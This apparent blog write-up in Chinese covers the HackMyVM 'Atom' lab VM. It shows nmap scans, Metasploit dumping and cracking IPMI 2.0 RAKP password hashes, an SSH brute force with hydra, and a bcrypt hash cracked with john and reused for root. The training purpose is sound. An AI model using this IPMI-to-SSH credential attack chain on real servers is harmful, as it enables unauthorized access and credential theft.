---
layout: config.default_layout
title: HackMyVM-Atom
date: 2025-04-20 00:00:44
updated: 2025-04-20 00:02:31
comments: true
tags: [Linux靶机,HackMyVM]
categories: 靶机
---

# Atom.

> https://hackmyvm.eu/machines/machine.php?vm=Atom
> 

Notes：**An easy little machine for beginners.**

## 前期踩点

```bash
➜  Atom nmap -sP 192.168.56.0/24                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-19 09:44 EDT
Nmap scan report for 192.168.56.1
Host is up (0.00013s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00024s latency).
MAC Address: 08:00:27:81:EF:A0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.45
Host is up (0.00030s latency).
MAC Address: 08:00:27:81:2E:EB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 14.93 seconds
```

```bash
➜  Atom nmap -sT -min-rate 10000 -p- 192.168.56.45    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-19 09:45 EDT
Nmap scan report for 192.168.56.45
Host is up (0.0028s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:81:2E:EB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
```

只扫描出一个端口肯定有猫腻，把 `UDP` 也扫了

```bash
➜  Atom nmap -sU -min-rate 10000 -p- 192.168.56.45                                                                                                                                                                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-19 09:46 EDT
Warning: 192.168.56.45 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.45
Host is up (0.00046s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp
MAC Address: 08:00:27:81:2E:EB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 79.41 seconds
```

## 623 UDP

### 扫描漏洞

经过查阅 `623 UDP` 一般是 `ipmi`

![image.png](image.png)

使用 `MSF` 搜索一下相关漏洞

```bash
msf6 > search ipmi

Matching Modules
================

   #   Name                                                                Disclosure Date  Rank    Check  Description
   -   ----                                                                ---------------  ----    -----  -----------
   0   auxiliary/scanner/ipmi/ipmi_cipher_zero                             2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1   auxiliary/scanner/ipmi/ipmi_dumphashes                              2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2   auxiliary/scanner/ipmi/ipmi_version                                 .                normal  No     IPMI Information Discovery
   3   exploit/multi/upnp/libupnp_ssdp_overflow                            2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4     \_ target: Automatic                                              .                .       .      .
   5     \_ target: Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1  .                .       .      .
   6     \_ target: Axis Camera M1011 5.20.1 UPnP/1.4.1                    .                .       .      .
   7     \_ target: Debug Target                                           .                .       .      .
   8   auxiliary/scanner/http/smt_ipmi_cgi_scanner                         2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   9   auxiliary/scanner/http/smt_ipmi_49152_exposure                      2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   10  auxiliary/scanner/http/smt_ipmi_static_cert_scanner                 2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   11  exploit/linux/http/smt_ipmi_close_window_bof                        2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   12  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal              2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
```

使用第二个模块扫描一下是否可以扫描出来版本信息

```bash
msf6 > use 2
msf6 auxiliary(scanner/ipmi/ipmi_version) > options

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 192.168.56.45
rhosts => 192.168.56.45
msf6 auxiliary(scanner/ipmi/ipmi_version) > exploit

[*] Sending IPMI requests to 192.168.56.45->192.168.56.45 (1 hosts)
[+] 192.168.56.45:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

是存在的 `IPMI-2.0`

### 利用漏洞

查阅漏洞，能找到： https://www.tenable.com/plugins/nessus/80101，并且模块中是有相对应的

使用上面查询出的第一个模块进行利用

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > use 1
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                                                                                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 192.168.56.45
rhosts => 192.168.56.45
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 192.168.56.45:623 - IPMI - Hash found: admin:b4003b448200000098cc0704b039fc37be9eef071aeec2762d59b3b4383fb4bb12f5e6f85c436472a123456789abcdefa123456789abcdef140561646d696e:11ea274192b903a781459a37c664ec45d25a0648
[+] 192.168.56.45:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

找到用户 `admin`:`cukorborso`

使用 `ipmitool` 来查询数据

查询用户

```bash
ipmitool -I lanplus -H 192.168.56.45 -U admin -P cukorborso user list
```

![image.png](image1.png)

将用户名提取保存下来保存为 `user_list`

```bash
➜  Atom ipmitool -I lanplus -H 192.168.56.45 -U admin -P cukorborso user list > user_list_raw
➜  Atom cat user_list_raw | awk '{if ($2 != "true" && $2 != "Name") print $2}' > user_list  
```

有了用户名后，我们再使用 MSF 的 `dumphash` 模块来爆破

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > use 1
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                192.168.56.45                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set user_file user_list
user_file => user_list
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set pass_file /usr/share/wordlists/rockyou.txt
pass_file => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 192.168.56.45:623 - IPMI - Hash found: admin:1178f737020900003bc8aa5c496d82bf8c085ddec23b24a2ebf374125d00c803393d3a21ccf12b80a123456789abcdefa123456789abcdef140561646d696e:cf3ac30535ef6cc08d6b7245da848b787ae6c971
[+] 192.168.56.45:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[+] 192.168.56.45:623 - IPMI - Hash found: analiese:2b3c74f882090000231fcc9a17a1cea0a89b1ee853272901c03374bef2b46d16625f85a1895ca098a123456789abcdefa123456789abcdef1408616e616c69657365:89182469aa3a9fc4bff3e4692f8f99df55779aa9
[+] 192.168.56.45:623 - IPMI - Hash for user 'analiese' matches password 'honda'
[+] 192.168.56.45:623 - IPMI - Hash found: briella:d4ecaa8b040a0000ea03b39ea5aa362be9f4bb7eb90c6cee861808b9d28dae0f7e33c321fe5fcf7aa123456789abcdefa123456789abcdef1407627269656c6c61:08cd9c452070cec0ec719f9a50fef7105c9f6704
[+] 192.168.56.45:623 - IPMI - Hash for user 'briella' matches password 'jesus06'
[+] 192.168.56.45:623 - IPMI - Hash found: richardson:9e711914860a0000a001c32278c8aeff4e785ce4c0ff552f1a63eba802867450008a82388a675a78a123456789abcdefa123456789abcdef140a72696368617264736f6e:5ec49097b8b453081fe7d9d204f9207afdb6517e
[+] 192.168.56.45:623 - IPMI - Hash for user 'richardson' matches password 'darell'
[+] 192.168.56.45:623 - IPMI - Hash found: carsten:9a642093080b00009593f325e9fb782ffa3cd5aceb2ec39900beb792ee6f782572508f3219764a9ca123456789abcdefa123456789abcdef14076361727374656e:214c6b91588b0f04c52b8fbcdaf3e074539fec5e
[+] 192.168.56.45:623 - IPMI - Hash for user 'carsten' matches password '2468'
[+] 192.168.56.45:623 - IPMI - Hash found: sibylle:ca7476dd820b0000b24ef5d3727f4faa537938bf61287a54f0f5cef860ed9c2e5a823a3927c01c26a123456789abcdefa123456789abcdef1407736962796c6c65:8ed73b01ac4633fc36dc1ff1ac7aa3bc61727058
[+] 192.168.56.45:623 - IPMI - Hash for user 'sibylle' matches password 'me4life'
[+] 192.168.56.45:623 - IPMI - Hash found: wai-ching:3af532ef0a0c0000548e717cf244bee8535dc846d120cda1f2f620cda57ffabc64b14a4c2496c19ea123456789abcdefa123456789abcdef14097761692d6368696e67:b1dc7b0f6c54629058a94bb21f8a6758f303ed39
[+] 192.168.56.45:623 - IPMI - Hash for user 'wai-ching' matches password '10101979'
[+] 192.168.56.45:623 - IPMI - Hash found: jerrilee:87702118840c0000ebd91140cf32c9677e6311cb0808617fd8c1068b20bd8c125a2e524e7994eef9a123456789abcdefa123456789abcdef14086a657272696c6565:49cecb5e0ffe8fcdb7f9f52c798e368322fb786f
[+] 192.168.56.45:623 - IPMI - Hash for user 'jerrilee' matches password 'number17'
[+] 192.168.56.45:623 - IPMI - Hash found: glynn:e458f4e5060d000052a8649cc95b6a7735bbc9a6c4ed12974e73bcae5ed763270625f408ce8c5feba123456789abcdefa123456789abcdef1405676c796e6e:4cf4f30088af5952ecc4181eb65ae8558c6e2e2f
[+] 192.168.56.45:623 - IPMI - Hash for user 'glynn' matches password 'evan'
[+] 192.168.56.45:623 - IPMI - Hash found: asia:0e22b842880d0000b3fd969f19bfccb0c2a57626317bd80cdf819a3f97da920b2e54c17f73c4bbf9a123456789abcdefa123456789abcdef140461736961:374939c6f099fb68b38782cdafa702b3dccaa16d
[+] 192.168.56.45:623 - IPMI - Hash for user 'asia' matches password 'TWEETY1'
[+] 192.168.56.45:623 - IPMI - Hash found: zaylen:bb9a005b020e00009d067807265d192116b5ee9613cf687b98f8d0c22965e405bc88aac611312e61a123456789abcdefa123456789abcdef14067a61796c656e:f736827632692e2ed39e5727ee0f2b5e52cf04da
[+] 192.168.56.45:623 - IPMI - Hash for user 'zaylen' matches password '120691'
[+] 192.168.56.45:623 - IPMI - Hash found: fabien:3e63d9778a0e000028cbc8f98b246873ff16cb5ede9bff8f7c23b7b833808e6ddfe85c7b88fff68da123456789abcdefa123456789abcdef140666616269656e:6e883d5cb6779cdce390b674e961f602a61cca54
[+] 192.168.56.45:623 - IPMI - Hash for user 'fabien' matches password 'chatroom'
[+] 192.168.56.45:623 - IPMI - Hash found: merola:a16da433040f000054109feb99171620d3dc1723132931867a7edd8223503854664bf9cfde629fe6a123456789abcdefa123456789abcdef14066d65726f6c61:ca643dc9e0f07b3140023eaafcfacab40a205b9d
[+] 192.168.56.45:623 - IPMI - Hash for user 'merola' matches password 'mackenzie2'
[+] 192.168.56.45:623 - IPMI - Hash found: jem:9d586344860f0000080ff2dad62496bdb0b0e8e109101dcac8e58c409c3043160a0a6f7e4b61f44da123456789abcdefa123456789abcdef14036a656d:816e9efd524d7546783be92fe8898969c42793ca
[+] 192.168.56.45:623 - IPMI - Hash for user 'jem' matches password '081704'
[+] 192.168.56.45:623 - IPMI - Hash found: riyaz:0c60d941081000000ed735cdcfb4b61fe7d050acee2bf58c19a885d9ee948802d69c2a62b139e7b4a123456789abcdefa123456789abcdef1405726979617a:15e0029485d923f492a9b71558ec9a3e0737d16d
[+] 192.168.56.45:623 - IPMI - Hash for user 'riyaz' matches password 'djones'
[+] 192.168.56.45:623 - IPMI - Hash found: laten:69369c9a821000009351526b95cfe4eed53a63de73d62a88ce275ff2944e666dc8df617ae263ac8fa123456789abcdefa123456789abcdef14056c6174656e:ae74108c648006d4e7a3396378ab0e0e1f3f23dc
[+] 192.168.56.45:623 - IPMI - Hash for user 'laten' matches password 'trick1'
[+] 192.168.56.45:623 - IPMI - Hash found: cati:fd6bcce6041100005fe5d096fe9651b74c3c14bde782e5fd999946282ced2ea17f4613e2235c2845a123456789abcdefa123456789abcdef140463617469:7b0d65c2069626b7b91db77097151451cee78754
[+] 192.168.56.45:623 - IPMI - Hash for user 'cati' matches password '122987'
[+] 192.168.56.45:623 - IPMI - Hash found: onida:cb****************8ec7472094a9728d90dff00ff6ff2b5606fe61abdd0f6a4394f6a123456789abcdefa123456789abcdef14056f6e696461:b9faf7fc050cd7fe0a6dd83160025f2a069b3901
[+] 192.168.56.45:623 - IPMI - Hash for user 'onida' matches password 'jiggman'
[+] 192.168.56.45:623 - IPMI - Hash found: rozalia:f1b1f0f08611000002dc443f8903ab15611e923ad6c435dc8edbe9456c952627098b7d7a8e9d5a50a123456789abcdefa123456789abcdef1407726f7a616c6961:c443469ae488d8c7c2220c9cc94a0ccdfb10c55b
[+] 192.168.56.45:623 - IPMI - Hash for user 'rozalia' matches password 'batman!'
[+] 192.168.56.45:623 - IPMI - Hash found: terra:8b398a6b021300008ba3ee3c8eaef753bdadc58843decdcb41bbc18eb293f0dbf757031bec025092a123456789abcdefa123456789abcdef14057465727261:a44928e88c8575c054b14b29247ab913f4e92e8d
[+] 192.168.56.45:623 - IPMI - Hash for user 'terra' matches password 'sexymoma'
[+] 192.168.56.45:623 - IPMI - Hash found: ranga:ac84fa41841300001deedc9af2e14842e1c906b38b00d5756df6b60f7c7b599a58ae479064dd698ea123456789abcdefa123456789abcdef140572616e6761:9460d9d6295aa4c808da0874bd0c885ecbd6bb86
[+] 192.168.56.45:623 - IPMI - Hash for user 'ranga' matches password 'jaffa1'
[+] 192.168.56.45:623 - IPMI - Hash found: harrie:5cc1a780061400006ef1f69a3df2a3184cd14e8b09d0c8c4db2f62c16f00868c5bfb412c3b0d71d4a123456789abcdefa123456789abcdef1406686172726965:96f54e532c025c199145d498e900de9f6a44771e
[+] 192.168.56.45:623 - IPMI - Hash for user 'harrie' matches password '071590'
[+] 192.168.56.45:623 - IPMI - Hash found: pauly:aa06e61588140000b2326540c24f36ff6d187c759a473e1b3aa05a76bb805c72af10d0292232f3c3a123456789abcdefa123456789abcdef14057061756c79:588f8e276cfd2f48ba7104e4d9c0a2eb730651f1
[+] 192.168.56.45:623 - IPMI - Hash for user 'pauly' matches password '515253'
[+] 192.168.56.45:623 - IPMI - Hash found: els:86b16c7f0a15000039cf03b63135b1bfc30739f1d1923352afcca20c5893b2f94ca3dc3d3c5d9664a123456789abcdefa123456789abcdef1403656c73:91bce9039508513a7917af6ae830c2cb6b641b9f
[+] 192.168.56.45:623 - IPMI - Hash for user 'els' matches password 'dezzy'
[+] 192.168.56.45:623 - IPMI - Hash found: bqb:9cf9e30e821500003fbb41656f22ad3eada26d97025f0e776eb39f2952a48349882a19f00a78c140a123456789abcdefa123456789abcdef1403627162:241a3d3be151b373aa098b5b1514d291b610f144
[+] 192.168.56.45:623 - IPMI - Hash for user 'bqb' matches password '290992'
[+] 192.168.56.45:623 - IPMI - Hash found: karlotte:24a617ff04160000bb5dfde9075211a7c5323559654b4ce0a8c927818f97b238b883fb1c9463213aa123456789abcdefa123456789abcdef14086b61726c6f747465:598318eb7c8d1bb80247aad2113afea734c1c881
[+] 192.168.56.45:623 - IPMI - Hash for user 'karlotte' matches password 'emeralds'
[+] 192.168.56.45:623 - IPMI - Hash found: zali:4a5d264b86160000ff1edab92b60c58fd1842cdad3820ca5595cb79f833c40e550ea30686ce829eda123456789abcdefa123456789abcdef14047a616c69:377406acdc6608f717494387b48e8de3765efe69
[+] 192.168.56.45:623 - IPMI - Hash for user 'zali' matches password 'poynter'
[+] 192.168.56.45:623 - IPMI - Hash found: ende:a3734f1b081700006b4c34f165555cacf0589851830e5e1add730a9180cd0968139b970a1a0a3cb5a123456789abcdefa123456789abcdef1404656e6465:eda1d6df1ada49a5634c56c852ab0a82876dad71
[+] 192.168.56.45:623 - IPMI - Hash for user 'ende' matches password 'tripod'
[+] 192.168.56.45:623 - IPMI - Hash found: stacey:4d3aa5458a1700006a24568fec9ac720ff4577b83aba4d309a264dbdafe4f3572087454debbd2560a123456789abcdefa123456789abcdef1406737461636579:545a013b052f280d3cf1c799188f4a1000311c67
[+] 192.168.56.45:623 - IPMI - Hash for user 'stacey' matches password 'castillo1'
[+] 192.168.56.45:623 - IPMI - Hash found: shirin:6f435d1b021800009acd55976b1aa8d7aa533460328c67a64df4d546c6f4ee7a5b59d946d33e00baa123456789abcdefa123456789abcdef140673686972696e:41d0ca45a782468da41370a6fecaad5a898a94bf
[+] 192.168.56.45:623 - IPMI - Hash for user 'shirin' matches password 'kittyboo'
[+] 192.168.56.45:623 - IPMI - Hash found: kaki:4367ff258418000070981726374540668e5db29e1b805c9489acb104d8c299952e0cf501d9ed24fba123456789abcdefa123456789abcdef14046b616b69:e0e5ac1460acb806b1b8d6103e581401a6a0d7d7
[+] 192.168.56.45:623 - IPMI - Hash for user 'kaki' matches password 'numberone'
[+] 192.168.56.45:623 - IPMI - Hash found: saman:d936de8b06190000a94f3411ac81163de79cf31364824f25154dbf2b91ff2a6980c9658147eca02fa123456789abcdefa123456789abcdef140573616d616e:a1e43fb3e76e39af2564b7aa1c6d5b5d960dceac
[+] 192.168.56.45:623 - IPMI - Hash for user 'saman' matches password '090506'
[+] 192.168.56.45:623 - IPMI - Hash found: kalie:db49bdd2881900001d152554caa009bd5119549a4e9b246e90543f3852810a1a2a3b104bbeea0c56a123456789abcdefa123456789abcdef14056b616c6965:fdc5f3f1960368d557639e81f3dce9e6321599f7
[+] 192.168.56.45:623 - IPMI - Hash for user 'kalie' matches password 'billandben'
[+] 192.168.56.45:623 - IPMI - Hash found: deshawn:08d755de021a0000a1a8a7a4f3ee1052c0f878acd00271d19b29c4fee0dcef0be708ae21ee7f4caea123456789abcdefa123456789abcdef14076465736861776e:30be44872b9d50e9a2774205d1ace2b96e33ccaa
[+] 192.168.56.45:623 - IPMI - Hash for user 'deshawn' matches password 'milo123'
[+] 192.168.56.45:623 - IPMI - Hash found: mayeul:9ce59660841a0000a31ca569584309ab03bc1364b83c45c1b346d0a9893d3fad9fbbe74f20a27a89a123456789abcdefa123456789abcdef14066d617965756c:3679eb0d50b25eb637d36c2bf52c696b87877f19
[+] 192.168.56.45:623 - IPMI - Hash for user 'mayeul' matches password '241107'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

将结果保存为 `output` ，然后将密码提取保存

```bash
➜  Atom cat output | awk -F "password '" '{print $2}' | tr -d "'" | awk 'NF' > pass
```

## SSH 爆破

得到用户名和密码后，来尝试爆破 `SSH`

```bash
➜  Atom hydra -L user_list -P pass -t 12 192.168.56.45 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 11:34:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 12 tasks, 1260 login tries (l:36/p:35), ~105 tries per task
[DATA] attacking ssh://192.168.56.45:22/
[STATUS] 266.00 tries/min, 266 tries in 00:01h, 994 to do in 00:04h, 12 active
[22][ssh] host: 192.168.56.45   login: onida   password: jiggaman                                                                            
```

得到一组用户`onida`:`jiggaman`

在加目录下能找到 `user.txt`

```bash
onida@atom:~$ cat user.txt 
f75390001fa2fe806b4e3f1e5dadeb2b
```

## 提权

`sudo` 被删除了

查看当前监听端口

```bash
onida@atom:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                       0                                              0.0.0.0:623                                            0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                           0.0.0.0:623                                            0.0.0.0:*                                              
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       511                                          127.0.0.1:80                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                         127.0.0.1:34917                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*            
```

在本地中开放了 `80` 和 `34917`

那么 `/var/www/html` 可能存在信息

```bash
onida@atom:/var/www/html$ ls
atom-2400-database.db  css  img  index.php  js  login.php  profile.php  register.php  video
```

```bash
onida@atom:/var/www/html$ cat atom-2400-database.db 
QY&mtableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
))=indexsqlite_autoindex_users_1user$))tablelogin_attemptslogin_attemptsCREATE TABLE login_attempts (
    id INTEGER PRIMARY KEY,
    ip_address TEXT NOT NULL,
    attempt_time INTEGER NOT NULL
nKEatom$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
        atom
```

将 `atom-2400-database.db` 传到 `kali` ，使用 `sqlite` 进行查询

```bash
sqlite> SELECT * from users;
1|atom|$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
```

将密码保存到 `hash` 中，使用 `john` 进行破解

```bash
➜  Atom john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
madison          (?)     
1g 0:00:00:00 DONE (2025-04-19 11:48) 1.587g/s 457.1p/s 457.1c/s 457.1C/s killer..babyboy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
➜  Atom 
```

得到密码 `madison` ，进行密码碰撞

```bash
onida@atom:/var/www/html$ su root
Password: 
root@atom:/var/www/html# 
```

直接拿到了 `root` 权限，读取 `root.txt`

```
root@atom:~# cat root.txt
d3a4fd660f1af5a7e3c2f17314f4a962
```